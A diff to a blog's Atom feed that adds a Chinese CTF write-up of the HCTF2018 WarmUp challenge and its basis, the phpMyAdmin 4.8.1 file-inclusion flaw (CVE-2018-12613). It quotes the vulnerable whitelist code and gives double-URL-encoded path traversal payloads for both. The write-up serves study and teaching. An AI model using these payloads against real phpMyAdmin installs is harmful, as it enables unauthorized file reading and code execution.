@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://dddwmr.github.io/"/>
-  <updated>2019-08-25T08:34:47.992Z</updated>
+  <updated>2019-10-21T09:43:53.791Z</updated>
   <id>http://dddwmr.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://dddwmr.github.io/2019/10/21/Untitled-1/"/>
+    <id>http://dddwmr.github.io/2019/10/21/Untitled-1/</id>
+    <published>2019-10-21T09:35:12.752Z</published>
+    <updated>2019-10-21T09:43:53.791Z</updated>
+    
+    <content type="html"><![CDATA[<p>#BUUCTF WEB</p><p>##HCTF2018WarmUp<br>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])  ##不能为空        &amp;&amp; is_string($_REQUEST['file'])  ##是字符串        &amp;&amp; emmm::checkFile($_REQUEST['file'])  ##上面checkfile返回为true    ) {        include $_REQUEST['file'];        exit;    }     else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt;</code></pre><p>hint.php</p><pre><code>flag not here, and flag in ffffllllaaaagggg</code></pre><p>###解题<br>参考下面整理的漏洞，就可以构造出payload<br><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code><br>传入得到flag</p><p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p><p>##phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</p><p>###漏洞原理<br>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p><p>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</p><p>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</p><p>###漏洞成因<br>   在index.php里50-63行</p><pre><code>$target_blacklist = array (    'import.php', 'export.php');// If we have a valid target, let's load that script insteadif (! empty($_REQUEST['target'])    &amp;&amp; is_string($_REQUEST['target'])    &amp;&amp; ! preg_match('/^index/', $_REQUEST['target'])    &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST['target'])) {    include $_REQUEST['target'];    exit;}</code></pre><p>满足五个条件<br>   $_REQUEST[‘target’]不为空<br>   $_REQUEST[‘target’]是字符串<br>   $_REQUEST[‘target’]不以index开头<br>   $_REQUEST[‘target’]不在$target_blacklist中（import.php和export.php）<br>   <em>Core::checkPageValidity($_REQUEST[‘target’]为真<br>则包含参数所指定的文件</em></p><p>代码在libraries\classes\Core.php 443-476行<br>Core::checkPageValidity</p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = [])    {        if (empty($whitelist)) {            $whitelist = self::$goto_whitelist;        }        if (! isset($page) || !is_string($page)) {            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . '?', '?')        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . '?', '?')        );        if (in_array($_page, $whitelist)) {            return true;        }        return false;    }</code></pre><p>###分析代码<br>mb_substr：截取字符串（与substr的区别是它可以截取中文）<br>mb_strpos:匹配（同理，可截取中文）<br>可以看到代码中用了两次有关截取?前字符 判断文件名是否在白名单里的操作<br>第一次很好理解，这里不再叙述<br>phpmyadmin开发团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次<br>而就在这里出现了漏洞<br>如果传入<br><code>target=db_sql.php%253f/../../test.txt</code><br>浏览器自行解码一次<br>变成:<br><code>target=db_sql.php%3f/../../test.txt</code><br>也就是说$_page = mb_substr传入数据里没?<br>所以这时的$_page没被截取<br>继续往下看，先经过函数urldecode一次<br>变成：<br><code>target=db_sql.php?/../../test.txt</code><br>这时候截取到问号前即$_page=db_dql.php符合条件<br>通过判断则能包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#BUUCTF WEB&lt;/p&gt;
+&lt;p&gt;##HCTF2018WarmUp&lt;br&gt;菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎&lt;br&gt;查看源码给了source.php,如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    highlight_file(_
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>insert into</title>
